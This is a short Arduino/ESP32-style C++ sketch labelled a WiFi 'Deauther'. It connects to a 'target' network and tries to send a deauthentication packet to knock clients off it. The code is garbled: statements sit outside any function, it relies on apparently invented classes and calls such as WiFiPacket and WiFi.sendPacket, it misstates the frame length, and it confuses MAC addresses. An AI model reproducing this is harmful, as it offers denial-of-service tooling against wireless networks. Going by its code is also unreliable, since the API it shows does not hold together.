#include <WiFi.h>

// Set the WiFi mode to station mode
WiFi.mode(WIFI_STA);

// Set the WiFi channel to 1 (you can change this to any channel you want)
WiFi.channel(1);

// Set the WiFi MAC address (you can change this to any MAC address you want)
byte mac[] = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB };

// Set the target network SSID and password
const char* ssid = "your_target_ssid";
const char* password = "your_target_password";

void setup() {
  Serial.begin(115200);

  // Connect to the target network
  WiFi.begin(ssid, password);
  while (WiFi.status()!= WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }

  Serial.println("Connected to WiFi");
  Serial.println("Starting Deauther...");

  // Start the Deauther
  deauth();
}

void loop() {
  // Do nothing
}

void deauth() {
  // Create a WiFi packet
  WiFiPacket packet;

  // Set the packet type to deauthentication
  packet.setType(WIFI_PKT_DEAUTH);

  // Set the packet length to 12 (minimum length for a deauthentication packet)
  packet.setLength(12);

  // Set the packet data to the target network MAC address
  packet.setData(mac, 6);

  // Send the packet
  WiFi.sendPacket(packet);

  Serial.println("Deauth packet sent!");
  delay(1000);
}
